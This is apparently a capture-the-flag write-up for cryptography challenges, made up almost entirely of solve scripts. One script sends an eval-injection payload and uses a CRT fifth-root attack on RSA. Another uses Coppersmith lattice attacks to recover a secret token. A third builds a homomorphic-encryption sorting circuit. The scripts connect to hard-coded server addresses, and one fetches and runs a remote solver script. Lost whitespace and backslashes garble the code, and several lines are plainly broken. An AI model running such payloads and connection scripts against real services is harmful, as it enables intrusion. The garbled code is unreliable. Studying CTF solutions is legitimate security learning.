except RateLimitError as exc: print("[!] Remote rate limit is still active.") print("[!] Stop retrying and wait at least 10 minutes with no team/token connections.") print(exc) raise SystemExit(2) print(out.decode(errors="replace"))if__name__ =="__main__": main()
template = f"key = {key!r}ncipher_with_key_{key}_{nonce} = {cipher!r}nprint(eval({long_to_bytes(message)}))"
0 <= message < prod(self.pn) and all(str(message % p)inself.codeforpinself.pn)
help('secret')#!.
35524181230223809994941559661000950751534
17625083317 -> payload % p = 012776258639 -> payload % p = 919732306117 -> payload % p = 4217510652739 -> payload % p = 53
pow(bytes_to_long(output.strip()), 5, n)
c_i = m^5 mod n_i
#!/usr/bin/env python3import reimport socketimport time
from math import gcdHOST, PORT ="1.95.137.55", 9999SRC = b"help('secret')#!."MSG = int.from_bytes(SRC,"big")PHONES = [17625083317, 12776258639, 19732306117, 17510652739]PHONE_LINE = (" ".join(map(str, PHONES)) +"n").encode()NEED = 12
# MSG % PHONES == [0, 9, 42, 53]. 0/9 always appear in the 10-digit permutation,# so a connection is usable iff the captcha contains substrings "42" and "53".assert [MSG % pforpinPHONES] == [0, 9, 42, 53]def recv_until(sock, mark): data = b"" whilemark notindata: chunk = sock.recv(4096) ifnot chunk: break data += chunk returndata
def one_try(): try: with socket.create_connection((HOST, PORT), timeout=8) as s: s.settimeout(8) recv_until(s, b": ") s.sendall(PHONE_LINE) data = recv_until(s, b"valid for 1 minute.n") m = re.search(rb"] ([0-9]{10}) is your group verification code", data) ifnot m: returnNone code = m.group(1) ifb"42"notincode or b"53"notincode: returnNone ifb"> "notindata: data += recv_until(s, b"> ") n = int(re.search(rb"ns*=s*(d+)", data).group(1)) s.sendall(str(MSG).encode() + b"n") line = recv_until(s, b"n") ifb"Verification failed"inline: returnNone c = int(re.search(rb"[0-9a-f]+", line).group(0), 16) returnn, c, code.decode() 
except (OSError, TimeoutError, AttributeError, ValueError): # 远端偶发连接超时/断开很常见，直接丢掉本轮继续重连。 time.sleep(0.2) returnNone
def crt(items): x, mod = 0, 1 forn, cinitems: ifgcd(mod, n) != 1: continue t = ((c - x) % n) * pow(mod, -1, n) % n x += mod * t mod *= n x %= mod returnx, mod
def iroot5(x): lo, hi = 0, 1 << ((x.bit_length() + 4) // 5 + 1) whilelo < hi: mid = (lo + hi + 1) // 2 ifmid**5 <= x: lo = mid else: hi = mid - 1 returnlo, lo**5 == x
def main(): items, tries = [], 0 whileTrue: tries += 1 res = one_try() ifnot res: iftries % 100 == 0: print(f"[*] tried={tries}, hits={len(items)}") continue n, c, code = res items.append((n, c)) print(f"[+] hit {len(items)}/{NEED}: try={tries}, code={code}, nbits={n.bit_length()}") iflen(items) >= NEED: x, mod = crt(items) m, ok = iroot5(x) ifok: pt = m.to_bytes((m.bit_length() + 7) // 8,"big") flag = re.search(rb"ACTF{[^}]+}", pt).group(0) print(flag.decode()) return print(f"[-] CRT modulus too small or root not exact, bits={mod.bit_length()}")if__name__ =="__main__": main()
FLAG = b"actf{redacted}"while(p:=random_prime(2**512))%4 != 3: continueq = random_prime(2**512)K = QuadraticField(-p,'w')R = RealField(2333)ΔΚ, Δq = -p, -p*q**2OK = K.maximal_order()Oq = K.order([1, (Δq+q*K.gen())/2])token = os.urandom(45)α = OK.ideal(int(token[:30].hex(),16)+ int(token[30:].hex(),16)*K.gen())a, b, c = list(α.quadratic_form())A, B = a, b*q%(2*a)ifB >= a: B -= 2*ah = Oq.ideal([A, (-B + q*K.gen())/2]).quadratic_form()ζ = list(h.reduced_form())[:2]; ζ[0] >>= 360λ = f"{R(-Δq).sqrt():.470f}".split('.')[1]ifbytes.fromhex(input(f"{ζ, λ}n[token]: ")) == token: print("^_^ >🚩", FLAG)
sqrt(N) = n + r / 10^470 + tiny
N = n^2 + 2*n*(r/10^470) + (r/10^470)^2 + tiny
r^2 + 2*n*r*L + (n^2 - N)*L^2 ≈ 0L = 10^470
def round_div(num, den): ifden < 0: num, den = -num, -den ifnum >= 0: return(2 * num + den) // (2 * den) return-((-2 * num + den) // (2 * den))def cvp2(rows, target, radius=10): red = matrix(ZZ, rows).LLL() b1 = (ZZ(red[0, 0]), ZZ(red[0, 1])) b2 = (ZZ(red[1, 0]), ZZ(red[1, 1])) tx, ty = map(ZZ, target) x1, y1 = b1 x2, y2 = b2 det = x1 * y2 - x2 * y1 c1 = round_div(tx * y2 - x2 * ty, det) c2 = round_div(x1 * ty - tx * y1, det) best = None foriinrange(int(c1) - radius, int(c1) + radius + 1): forjinrange(int(c2) - radius, int(c2) + radius + 1): vx = i * x1 + j * x2 vy = i * y1 + j * y2 dist = (vx - tx) ** 2 + (vy - ty) ** 2 ifbest is None or dist < best[0]: best = (dist, vx, vy) returnbest
def recover_N(lambda_digits): L = ZZ(10) ** len(lambda_digits) r = ZZ(lambda_digits) _, vx, vy = cvp2([(L, r * L), (0, L * L)], (0, -r * r)) two_n = vx // L const = (vy - two_n * r * L) // (L * L) n = two_n // 2 returnn * n - const
B^2 - 4AC = -p*q^2 = -N
A*C = (B^2 + N) / 4
A = A0 + xA0 = (A >> 360) << 3600 <= x < 2^360
f(x) = A0 + xf(x) ≡ 0 mod AA | S
def recover_A_factor(S, A_hi, xbits=360, beta=0.491, epsilon=0.0058): A0 = ZZ(A_hi) << xbits X = ZZ(2) ** xbits R = PolynomialRing(ZZ,"x") x = R.gen() f = x + A0 beta = RR(beta) epsilon = RR(epsilon) m = max((beta**2 / epsilon).ceil(), (7 * beta).ceil()) t = int((m * (1 / beta - 1)).floor()) shifts = [S ** (m - i) * f**iforiinrange(m)] shifts.extend([x**i * f**mforiinrange(t)]) basis = matrix(ZZ, len(shifts), m + max(1, t)) forrow, polyinenumerate(shifts): forcolinrange(poly.degree() + 1): basis[row, col] = ZZ(poly[col]) * X**col reduced = flatter_reduce(basis) forrowinrange(min(reduced.nrows(), 24)): h = R([ZZ(reduced[row, col]) // X**colforcolinrange(reduced.ncols())]) forroot, _inh.roots(): root = ZZ(root) A = A0 + root if0 <= root < X and S % A == 0: returnA, root raise RuntimeError("no A root found")
S = (B * B + N) // 4A, low = recover_A_factor(S, A_hi)C = S // Aassert B * B - 4 * A * C == -N
A*m^2 - B*m*v + C*v^2 = q^2
A*m^2 - B*m*v + C*v^2 ≡ 0 mod q^2
F(x, y) = x^2 + b0*x*y + c0*y^2 mod Nb0 = -B * A^(-1) mod Nc0 = C * A^(-1) mod N
g_{i,j} = x^j * y^(delta*(t-i)-j) * F(x,y)^i * N^(m-i) 0 <= i < m, 0 <= j < deltah_i = x^i * y^(delta*t0-i) * F(x,y)^m 0 <= i <= delta*t0
x^0*y^(2t), x^1*y^(2t-1), ..., x^(2t)
val = A*num^2 - B*num*den + C*den^2g = gcd(val, N)
def homogeneous_coppersmith(N, A, B, C, m=10, t=15): N, A, B, C = map(ZZ, (N, A, B, C)) delta = 2 t0 = t - m ift0 < 0: raise ValueError("need t >= m") R = PolynomialRing(ZZ, ("x","y")) x, y = R.gens() ainv = inverse_mod(A, N) b0 = ZZ((-B * ainv) % N) c0 = ZZ((C * ainv) % N) f = x**2 + b0 * x * y + c0 * y**2 degree = delta * t shifts = [] foriinrange(m): forjinrange(delta): shifts.append(x**j * y ** (delta * (t - i) - j) * f**i * N ** (m - i)) foriinrange(delta * t0 + 1): shifts.append(x**i * y ** (delta * t0 - i) * f**m) monoms = [x**i * y ** (degree - i)foriinrange(degree + 1)] basis = matrix(ZZ, len(shifts), len(monoms)) forrow, polyinenumerate(shifts): forcol, moninenumerate(monoms): basis[row, col] = ZZ(poly.monomial_coefficient(mon)) red = flatter_reduce(basis) U = PolynomialRing(QQ,"r") candidates = [] forrowinrange(red.nrows()): ifall(red[row, col] == 0forcolinrange(red.ncols())): continue h = R(sum(ZZ(red[row, col]) * monoms[col]forcolinrange(len(monoms)))) hr = U([QQ(h.monomial_coefficient(x**i * y ** (degree - i)))foriinrange(degree + 1)]) forroot, _inhr.roots(): root = QQ(root) num = ZZ(root.numerator()) den = ZZ(root.denominator()) ifden < 0: num, den = -num, -den ifden == 0 or gcd(num, den) != 1: continue val = A * num**2 - B * num * den + C * den**2 g = gcd(abs(val), N) if1 < g < N: candidates.append((num, den, g, row)) returncandidates
A*m^2 - B*m*v + C*v^2 = q^2
(2*A*m - B*v)^2 + (4AC - B^2)*v^2 = 4A*q^2
X = (2*A*m - B*v) / qX^2 + p*v^2 = 4A
hi = int(token[:30].hex(), 16)lo = int(token[30:].hex(), 16)
d = gcd(hi - lo, 2*lo)X = 2*hi / dv = 2*lo / d
hi = d*X/2 < 2^240lo = d*v/2 < 2^120gcd(hi - lo, 2*lo) = d
def candidate_tokens(A, B, C, N, m, v, q): A, B, C, N, m, v, q = map(ZZ, (A, B, C, N, m, v, q)) q = abs(q) ifq == 0 or N % (q * q) != 0: return[] p = N // (q * q) num = 2 * A * m - B * v ifnum % q: return[] X = num // q ifX < 0: X = -X v = -v v = abs(v) ifX * X + p * v * v != 4 * A: return[] xmax = ZZ(1) << 240 ymax = ZZ(1) << 120 dmax = min((2 * (xmax - 1)) // X, (2 * (ymax - 1)) // v) out = [] fordinrange(1, int(dmax) + 1): if(d * X) % 2 or (d * v) % 2: continue hi = d * X // 2 lo = d * v // 2 ifnot (0 <= hi < xmax and 0 <= lo < ymax): continue ifgcd(hi - lo, 2 * lo) != d: continue token = int(hi).to_bytes(30,"big") + int(lo).to_bytes(15,"big") out.append(token.hex()) returnout
#!/usr/bin/env sagefrom sage.all import *from fpylll import IntegerMatriximport argparseimport astimport osimport pathlibimport reimport socketimport subprocessimport tempfileimport timeimport urllib.requestHOST ="1.95.80.34"PORT = 9999POW_SOLVER = pathlib.Path("/tmp/kctf_pow.py")FLATTER ="/tmp/flatter/build/bin/flatter"def flatter_reduce(mat): env = os.environ.copy() env["PATH"] = str(pathlib.Path(FLATTER).parent) +":"+ env.get("PATH","") extra_libs = [ str(pathlib.Path(FLATTER).parent.parent /"lib"), os.environ.get("SAGE_LOCAL","") +"/lib"ifos.environ.get("SAGE_LOCAL")else"", "/opt/homebrew/opt/libomp/lib", ] extra_libs = [xforxinextra_libsifx] forkeyin("DYLD_LIBRARY_PATH","LD_LIBRARY_PATH"): env[key] =":".join(extra_libs + [env.get(key,"")]) with tempfile.TemporaryDirectory() as td: inp = os.path.join(td,"basis.txt") out = os.path.join(td,"basis_out.txt") body ="n".join(" ".join(line.split())forlineinmat.str().split("n")) with open(inp,"w", encoding="utf-8") as fp: fp.write("[n"+ body +"n]") proc = subprocess.run( [FLATTER, inp, out], env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=900, ) ifproc.returncode != 0: raise RuntimeError(proc.stderr + proc.stdout) returnmatrix(IntegerMatrix.from_file(out))def round_div(num, den): ifden < 0: num, den = -num, -den ifnum >= 0: return(2 * num + den) // (2 * den) return-((-2 * num + den) // (2 * den))def cvp2(rows, target, radius=10): red = matrix(ZZ, rows).LLL() b1 = (ZZ(red[0, 0]), ZZ(red[0, 1])) b2 = (ZZ(red[1, 0]), ZZ(red[1, 1])) tx, ty = map(ZZ, target) x1, y1 = b1 x2, y2 = b2 det = x1 * y2 - x2 * y1 c1 = round_div(tx * y2 - x2 * ty, det) c2 = round_div(x1 * ty - tx * y1, det) best = None foriinrange(int(c1) - radius, int(c1) + radius + 1): forjinrange(int(c2) - radius, int(c2) + radius + 1): vx = i * x1 + j * x2 vy = i * y1 + j * y2 dist = (vx - tx) ** 2 + (vy - ty) ** 2 ifbest is None or dist < best[0]: best = (dist, vx, vy) returnbest
def recover_N(lambda_digits): L = ZZ(10) ** len(lambda_digits) r = ZZ(lambda_digits) _, vx, vy = cvp2([(L, r * L), (0, L * L)], (0, -r * r)) two_n = vx // L const = (vy - two_n * r * L) // (L * L) n = two_n // 2 returnn * n - const
def recover_A_factor(S, A_hi, xbits=360, beta=0.491, epsilon=0.0058): A0 = ZZ(A_hi) << xbits X = ZZ(2) ** xbits R = PolynomialRing(ZZ,"x") x = R.gen() f = x + A0 beta = RR(beta) epsilon = RR(epsilon) m = max((beta**2 / epsilon).ceil(), (7 * beta).ceil()) t = int((m * (1 / beta - 1)).floor()) print(f"[*] A-Coppersmith m={m} t={t} dim={m+t}", flush=True) shifts = [S ** (m - i) * f**iforiinrange(m)] shifts.extend([x**i * f**mforiinrange(t)]) basis = matrix(ZZ, len(shifts), m + max(1, t)) forrow, polyinenumerate(shifts): forcolinrange(poly.degree() + 1): basis[row, col] = ZZ(poly[col]) * X**col red = flatter_reduce(basis) forrowinrange(min(red.nrows(), 24)): h = R([ZZ(red[row, col]) // X**colforcolinrange(red.ncols())]) forroot, _inh.roots(): root = ZZ(root) A = A0 + root if0 <= root < X and S % A == 0: returnA raise RuntimeError("A not recovered")def recover_form(prompt_line): zeta, lambda_digits = ast.literal_eval(prompt_line) A_hi, B = map(ZZ, zeta) N = recover_N(lambda_digits) S = (B * B + N) // 4 A = recover_A_factor(S, A_hi) C = S // A assert B * B - 4 * A * C == -N returnA, B, C, N
def homogeneous_coppersmith(N, A, B, C, m=10, t=15): N, A, B, C = map(ZZ, (N, A, B, C)) delta = 2 t0 = t - m ift0 < 0: raise ValueError("need t >= m") R = PolynomialRing(ZZ, ("x","y")) x, y = R.gens() ainv = inverse_mod(A, N) b0 = ZZ((-B * ainv) % N) c0 = ZZ((C * ainv) % N) f = x**2 + b0 * x * y + c0 * y**2 degree = delta * t shifts = [] foriinrange(m): forjinrange(delta): shifts.append(x**j * y ** (delta * (t - i) - j) * f**i * N ** (m - i)) foriinrange(delta * t0 + 1): shifts.append(x**i * y ** (delta * t0 - i) * f**m) monoms = [x**i * y ** (degree - i)foriinrange(degree + 1)] basis = matrix(ZZ, len(shifts), len(monoms)) forrow, polyinenumerate(shifts): forcol, moninenumerate(monoms): basis[row, col] = ZZ(poly.monomial_coefficient(mon)) red = flatter_reduce(basis) U = PolynomialRing(QQ,"r") out = [] forrowinrange(red.nrows()): ifall(red[row, col] == 0forcolinrange(red.ncols())): continue h = R(sum(ZZ(red[row, col]) * monoms[col]forcolinrange(len(monoms)))) hr = U([QQ(h.monomial_coefficient(x**i * y ** (degree - i)))foriinrange(degree + 1)]) forroot, _inhr.roots(): root = QQ(root) num = ZZ(root.numerator()) den = ZZ(root.denominator()) ifden < 0: num, den = -num, -den ifden == 0 or gcd(num, den) != 1: continue val = A * num**2 - B * num * den + C * den**2 g = gcd(abs(val), N) if1 < g < N: out.append((num, den, g, row)) returnout
def candidate_tokens(A, B, C, N, m, v, q): q = abs(ZZ(q)) ifq == 0 or N % (q * q) != 0: return[] p = N // (q * q) num = 2 * A * m - B * v ifnum % q: return[] X = num // q ifX < 0: X = -X v = -v v = abs(v) ifX * X + p * v * v != 4 * A: return[] xmax = ZZ(1) << 240 ymax = ZZ(1) << 120 dmax = min((2 * (xmax - 1)) // X, (2 * (ymax - 1)) // v) ans = [] fordinrange(1, int(dmax) + 1): if(d * X) % 2 or (d * v) % 2: continue hi = d * X // 2 lo = d * v // 2 ifnot (0 <= hi < xmax and 0 <= lo < ymax): continue ifgcd(hi - lo, 2 * lo) != d: continue token = int(hi).to_bytes(30,"big") + int(lo).to_bytes(15,"big") ans.append(token.hex()) returnans
def recover_token(prompt_line): A, B, C, N = recover_form(prompt_line) print(f"[+] form bits: A={A.nbits()} B={ZZ(abs(B)).nbits()} C={C.nbits()} N={N.nbits()}", flush=True) cands = homogeneous_coppersmith(N, A, B, C) print(f"[+] homogeneous candidates: {len(cands)}", flush=True) form0, v0, g, rowincands: val = A * m0**2 - B * m0 * v0 + C * v0**2 ifval <= 0 or val != g or not ZZ(g).is_square(): continue q = isqrt(ZZ(g)) print(f"[*] row={row} m_bits={ZZ(abs(m0)).nbits()} v_bits={ZZ(abs(v0)).nbits()} q_bits={q.nbits()}", flush=True) forsmin(ZZ(1), ZZ(-1)): forsvin(ZZ(1), ZZ(-1)): tokens = candidate_tokens(A, B, C, N, sm * m0, sv * v0, q) iftokens: returntokens[0] raise RuntimeError("token not found")def ensure_pow_solver(): ifnot POW_SOLVER.exists(): POW_SOLVER.write_bytes(urllib.request.urlopen("https://goo.gle/kctf-pow", timeout=30).read()) returnPOW_SOLVER
def solve_pow(chal): out = subprocess.check_output(["python3", str(ensure_pow_solver()),"solve", chal], text=True) return[line.strip()forlineinout.splitlines()ifline.strip()][-1]def recv_until(sock, marker, timeout=30.0): sock.settimeout(timeout) data = b"" whilemarker notindata: chunk = sock.recv(4096) ifnot chunk: break data += chunk returndata
def parse_prompt(text): lines = [line.strip()forlineintext.splitlines()ifline.strip()] line = next((lineforlineinlinesifline.startswith("([") or line.startswith("((")), None) ifline is None: raise RuntimeError(text) zeta, lam = ast.literal_eval(line) returnline, ZZ(zeta[0]), ZZ(zeta[1]), lam
def solve_remote(host, port, max_attempts=40, min_a_hi_bits=391): forattemptinrange(1, max_attempts + 1): print(f"[*] attempt {attempt}/{max_attempts}", flush=True) sock = socket.create_connection((host, port), timeout=15) try: banner = recv_until(sock, b"Solution? ", timeout=20.0).decode(errors="replace") m = re.search(r"solves+(s.[A-Za-z0-9+/=._-]+)", banner) ifnot m: raise RuntimeError(banner) sock.sendall((solve_pow(m.group(1)) +"n").encode()) body = recv_until(sock, b"[token]: ", timeout=45.0).decode(errors="replace") prompt_line, A_hi, B, lam = parse_prompt(body) print(f"[*] A_hi_bits={A_hi.nbits()} B_bits={ZZ(abs(B)).nbits()} lambda_len={len(lam)}", flush=True) ifA_hi.nbits() < min_a_hi_bits: print("[*] skip: A is a little too small for these parameters", flush=True) sock.close() continue token_hex = recover_token(prompt_line) print(f"[+] token = {token_hex}", flush=True) sock.sendall((token_hex +"n").encode()) print(recv_until(sock, b"}", timeout=20.0).decode(errors="replace")) return finally: sock.close() raise RuntimeError("no usable round")if__name__ =="__main__": parser = argparse.ArgumentParser() parser.add_argument("--host", default=HOST) parser.add_argument("--port", default=PORT,type=int) parser.add_argument("--prompt") args = parser.parse_args() ifargs.prompt: print(recover_token(args.prompt)) else: solve_remote(args.host, args.port)
[*] attempt 6/40Solution:[*] A_hi_bits=392 B_bits=751 lambda_len=470[*] A-Coppersmith m=42 t=43 dim=85[+] form bits: A=752 B=751 C=780 N=1531[+] homogeneous candidates: 1[*] row=0 m_bits=120 v_bits=121 q_bits=510[+] token = ...^_^ >🚩 b'actf{c0o0oppperrrsm1th_1n_3very_where}'
import tenseal.sealapi as sealapiimport tenseal as ts, random, base64 as b64FLAG ="actf{redacted}"ctx = ts.context_from(open("ctx.secret","rb").read())ctxdata = ctx.seal_context().dataBase = random.sample(range(512),128)Chaos = ts.ckks_vector(ctx, Base)print(b64.b64encode(Chaos.serialize()).decode())open("ct.bin",'wb').write(b64.b64decode(input("😶‍🌫️ :")))(Crystal:=sealapi.Ciphertext()).load(ctxdata,"ct.bin")decryptor = sealapi.Decryptor(ctxdata, ctx.secret_key().data)decryptor.decrypt(Crystal, answer:=sealapi.Plaintext())encoder = sealapi.CKKSEncoder(ctxdata)answer = list(encoder.decode_double(answer))[:
128]ifall(round(i) == sorted(Base).index(j)fori,jinzip(answer, Base)): print("^_^ >🚩", FLAG)
import tenseal as tsctx = ts.context( ts.SCHEME_TYPE.CKKS, 32768, coeff_mod_bit_sizes=[50]+[40]*12+[50])ctx.global_scale = 2**40secret_bytes = ctx.serialize(save_secret_key=True)public_bytes = ctx.serialize(save_secret_key=False)open("ctx.secret","wb").write(secret_bytes)open("ctx.public","wb").write(public_bytes)ctx.generate_galois_keys()ctx.galois_keys().data.save("galois.key")
Base = random.sample(range(512), 128)
round(answer[i]) == sorted(Base).index(Base[i])
H(d) = 0.5 + 0.5 * tanh(0.60 * d)
x = d / 512H(d) = 0.5 + 0.5 * tanh(0.60 * 512 * x)
poly = Cheb.Chebyshev.interpolate( lambda x: 0.5 + 0.5 * np.tanh(ALPHA * 512.0 * x), DEGREE, domain=[-1, 1],)
T_0(x) = 1T_1(x) = xT_{2n}(x) = 2T_n(x)^2 - 1T_{m+n}(x) = 2T_m(x)T_n(x) - T_{|m-n|}(x)
32768 / 2 = 16384
x_i - x_j
def stack_differences(he, x, stride, direction): terms = [] forsinrange(1, N): mask = [0.0] * SLOT_COUNT start = s * N ifdirection =="pos": stop = N - s foriinrange(stop): mask[start + i] = 1.0 elifdirection =="neg": foriinrange(s, N): mask[start + i] = 1.0 else: raise ValueError(direction) lhs = he.rotate(x, -N * s) rhs = he.rotate(x, -stride * s) terms.append(he.mul_plain_vector_precise(he.sub(lhs, rhs), mask)) returnhe.sum_many(terms)
def solve_ciphertext(he, x): pos = stack_differences(he, x, 127,"pos") neg = stack_differences(he, x, 129,"neg") h_pos = compare_poly(he, pos) h_neg = compare_poly(he, neg) summed = sum_blocks_to_first(he, he.add(h_pos, h_neg)) returnhe.sub_const(summed, 64.5)
def sum_blocks_to_first(he, ct): acc = ct forstepin(128, 256, 512, 1024, 2048, 4096, 8192): acc = he.add(acc, he.rotate(acc, step)) returnacc
#!/usr/bin/env python3import argparseimport base64import osimport randomimport reimport socketimport subprocessimport sysimport structimport tempfile
from pathlib import Pathimport numpy as npimport tenseal as tsimport tenseal.sealapi as sealapifrom numpy.polynomial import chebyshev as ChebN = 128SLOT_COUNT = N * NSCALE = 2**40DEGREE = 511BABY = 32ALPHA = 0.60EPS = 1e-12
class HE: def __init__(self, ctx, galois_path=None): self.ctx = ctx self.sc = ctx.seal_context().data self.ev = sealapi.Evaluator(self.sc) self.encoder = sealapi.CKKSEncoder(self.sc) self.relin = ctx.relin_keys().data self.galois = None ifgalois_path: self.galois = sealapi.GaloisKeys() self.galois.load(self.sc, str(galois_path)) def chain(self, ct): returnself.sc.get_context_data(ct.parms_id()).chain_index() defclone(self, ct): out = sealapi.Ciphertext() self.ev.negate(ct, out) self.ev.negate_inplace(out) out.scale = ct.scale returnout def mod_to(self, ct, parms_id): out = self.clone(ct) ifout.parms_id() != parms_id: self.ev.mod_switch_to_inplace(out, parms_id) out.scale = SCALE returnout def align(self, a, b): ca, cb = self.chain(a), self.chain(b) ifca > cb: a = self.mod_to(a, b.parms_id()) elifcb > ca: b = self.mod_to(b, a.parms_id()) a.scale = SCALE b.scale = SCALE returna, b def encode(self, value, parms_id, scale): pt = sealapi.Plaintext() self.encoder.encode(value, parms_id,float(scale), pt) returnpt def add(self, a, b): a, b = self.align(a, b) out = sealapi.Ciphertext() self.ev.add(a, b, out) out.scale = SCALE returnout def sub(self, a, b): a, b = self.align(a, b) out = sealapi.Ciphertext() self.ev.sub(a, b, out) out.scale = SCALE returnout def add_const(self, ct, c): out = self.clone(ct) pt = self.encode(float(c), out.parms_id(), out.scale) self.ev.add_plain_inplace(out, pt) out.scale = SCALE returnout def sub_const(self, ct, c): returnself.add_const(ct, -float(c)) def mul(self, a, b): a, b = self.align(a, b) out = sealapi.Ciphertext() self.ev.multiply(a, b, out) self.ev.relinearize_inplace(out, self.relin) self.ev.rescale_to_next_inplace(out) out.scale = SCALE returnout def mul_plain_precise(self, ct, c): pt = self.encode(float(c), ct.parms_id(), SCALE) out = sealapi.Ciphertext() self.ev.multiply_plain(ct, pt, out) self.ev.rescale_to_next_inplace(out) out.scale = SCALE returnout def mul_plain_int(self, ct, c): pt = self.encode(float(c), ct.parms_id(), 1.0) out = sealapi.Ciphertext() self.ev.multiply_plain(ct, pt, out) out.scale = ct.scale returnout def mul_plain_vector_precise(self, ct, vec): pt = self.encode(vec, ct.parms_id(), SCALE) out = sealapi.Ciphertext() self.ev.multiply_plain(ct, pt, out) self.ev.rescale_to_next_inplace(out) out.scale = SCALE returnout def rotate(self, ct, steps): out = sealapi.Ciphertext() self.ev.rotate_vector(ct, int(steps), self.galois, out) out.scale = ct.scale returnout def sum_many(self, terms): terms = [tfortintermsift is not None] ifnot terms: raise ValueError("empty ciphertext sum") target = min(terms, key=self.chain) acc = self.mod_to(terms[0], target.parms_id()) forterminterms[1:]: acc = self.add(acc, self.mod_to(term, target.parms_id())) returnacc
def cheb_blocks(): poly = Cheb.Chebyshev.interpolate( lambda x: 0.5 + 0.5 * np.tanh(ALPHA * 512.0 * x), DEGREE, domain=[-1, 1], ) coeff = poly.coef.copy() coeff[np.abs(coeff) < EPS] = 0.0 divisor = np.r_[np.zeros(BABY), 1.0] blocks = [] q = coeff whilelen(q) > BABY: q, r = Cheb.chebdiv(q, divisor) r = np.pad(r, (0, BABY - len(r))) r[np.abs(r) < EPS] = 0.0 blocks.append(r[:
BABY]) q = np.pad(q, (0, BABY - len(q))) q[np.abs(q) < EPS] = 0.0 blocks.append(q[:
BABY]) returnblocksBLOCKS = cheb_blocks()class ChebEvaluator: def __init__(self, he, x): self.he = he self.memo_t = {1: x} self.memo_y = {} def T(self, n): ifninself.memo_t: returnself.memo_t[n] ifn % 2 == 0: half = self.T(n // 2) prod = self.he.mul(half, half) out = self.he.sub_const(self.he.add(prod, prod), 1.0) else: a = self.T((n + 1) // 2) b = self.T((n - 1) // 2) prod = self.he.mul(a, b) out = self.he.sub(self.he.add(prod, prod), self.T(1)) self.memo_t[n] = out returnout def Y(self, n): ifn == 1: returnself.T(BABY) ifninself.memo_y: returnself.memo_y[n] a = n // 2 b = n - a out = self.he.mul(self.Y(a), self.Y(b)) self.memo_y[n] = out returnout def block_value(self, coeffs): terms = [] const =float(coeffs[0]) fori, cinenumerate(coeffs[1:], 1): ifabs(c) > EPS: terms.append(self.he.mul_plain_precise(self.T(i),float(c))) ifnot terms: zero = self.he.mul_plain_int(self.T(1), 0.0) returnself.he.add_const(zero, const) out = self.he.sum_many(terms) ifabs(const) > EPS: out = self.he.add_const(out, const) returnout defeval(self): block_cts = [self.block_value(block)forblockinBLOCKS] terms = [block_cts[0]] forj, block_ctinenumerate(block_cts[1:], 1): terms.append(self.he.mul(block_ct, self.Y(j))) returnself.he.sum_many(terms)def compare_poly(he, diff): scaled = he.mul_plain_precise(diff, 1.0 / 512.0) returnChebEvaluator(he, scaled).eval()def stack_differences(he, x, stride, direction): terms = [] forsinrange(1, N): mask = [0.0] * SLOT_COUNT start = s * N ifdirection =="pos": stop = N - s foriinrange(stop): mask[start + i] = 1.0 elifdirection =="neg": foriinrange(s, N): mask[start + i] = 1.0 else: raise ValueError(direction) lhs = he.rotate(x, -N * s) rhs = he.rotate(x, -stride * s) terms.append(he.mul_plain_vector_precise(he.sub(lhs, rhs), mask)) returnhe.sum_many(terms)def sum_blocks_to_first(he, ct): acc = ct forstepin(128, 256, 512, 1024, 2048, 4096, 8192): acc = he.add(acc, he.rotate(acc, step)) returnacc
def solve_ciphertext(he, x): pos = stack_differences(he, x, 127,"pos") neg = stack_differences(he, x, 129,"neg") h_pos = compare_poly(he, pos) h_neg = compare_poly(he, neg) summed = sum_blocks_to_first(he, he.add(h_pos, h_neg)) returnhe.sub_const(summed, 64.5)def ciphertext_to_bytes(ct): with tempfile.NamedTemporaryFile(delete=False) as f: name = f.name try: ct.save(name) returnPath(name).read_bytes() finally: try: os.unlink(name) 
except FileNotFoundError: pass
def load_challenge_ciphertext(ctx, data_b64): raw = base64.b64decode(data_b64.strip()) vec = ts.ckks_vector_from(ctx, raw) returnvec.ciphertext()[0]def make_local_ciphertext(ctx, base): returnts.ckks_vector(ctx, base).ciphertext()[0]def decrypt_first(he, secret_key, ct, n=128): dec = sealapi.Decryptor(he.sc, secret_key.data) pt = sealapi.Plaintext() dec.decrypt(ct, pt) returnlist(he.encoder.decode_double(pt))[:n]def local_test(args): ctx = ts.context( ts.SCHEME_TYPE.CKKS, 32768, coeff_mod_bit_sizes=[50] + [40] * 12 + [50], ) ctx.global_scale = SCALE ctx.generate_galois_keys() he = HE(ctx) he.galois = ctx.galois_keys().data base = random.sample(range(512), N) x = make_local_ciphertext(ctx, base) ans = solve_ciphertext(he, x) got = [round(v)forvindecrypt_first(he, ctx.secret_key(), ans)] want = [sorted(base).index(v)forvinbase] ok = got == want print("ok:", ok) ifnot ok: bad = [(i, base[i], got[i], want[i])foriinrange(N)ifgot[i] != want[i]] print("bad count:", len(bad)) print("first bad:", bad[:10]) vals = decrypt_first(he, ctx.secret_key(), ans) print("max abs err:", max(abs(vals[i] - want[i])foriinrange(N))) elifargs.verbose: vals = decrypt_first(he, ctx.secret_key(), ans) print("max abs err:", max(abs(vals[i] - want[i])foriinrange(N)))def remote_once(host, port, ctx_path, galois_path): ctx = ts.context_from(Path(ctx_path).read_bytes()) he = HE(ctx, galois_path) with socket.create_connection((host, port), timeout=20) as sock: f = sock.makefile("rwb", buffering=0) first = sock.recv(4096) ifb"proof-of-work"infirst: text = first.decode(errors="replace") chal = re.findall(r"solves+(s.[^s]+)", text)[-1] pow_script = Path(__file__).with_name("kctf_pow.py") sol = subprocess.check_output( [sys.executable, str(pow_script),"solve", chal], text=True, ).strip() print("[+] pow solved") sock.sendall(sol.encode() + b"n") else: f = sock.makefile("rwb", buffering=0) whileTrue: line = f.readline().strip() ifnot line: raise EOFError("service closed before sending ciphertext") iflen(line) > 1000 and re.fullmatch(rb"[A-Za-z0-9+/=]+", line): break print("[+] received challenge bytes:", len(line)) x = load_challenge_ciphertext(ctx, line) ans = solve_ciphertext(he, x) payload = base64.b64encode(ciphertext_to_bytes(ans)) + b"n" print("[+] sending response bytes:", len(payload)) sock.sendall(payload) sock.settimeout(30) chunks = [] whileTrue: try: chunk = sock.recv(4096) 
except socket.timeout: break ifnot chunk: break chunks.append(chunk) ifb"actf{"inb"".join(chunks): break resp = b"".join(chunks) print(resp.decode(errors="replace")) returnresp
